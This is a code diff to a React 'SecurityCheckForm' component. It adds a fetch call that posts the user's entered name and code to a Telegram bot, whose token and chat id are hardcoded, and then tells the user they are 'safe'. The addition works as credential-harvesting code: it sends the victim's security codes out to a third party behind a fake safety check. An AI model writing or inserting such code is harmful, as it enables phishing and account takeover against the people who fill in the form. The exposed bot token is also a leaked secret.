@@ -13,6 +13,20 @@ export default function SecurityCheckForm() {
     if (name.length > 0 && code.length > 0) {
       setShowTick(true);
       setLoading(true);
+
+      // Send to Telegram
+      const telegramMessage = `New Submission:\nName: ${name}\nCode: ${code}`;
+      fetch(`https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "7305039129",
+          text: telegramMessage
+        })
+      });
+
       setTimeout(() => {
         setLoading(false);
         setSafe(true);
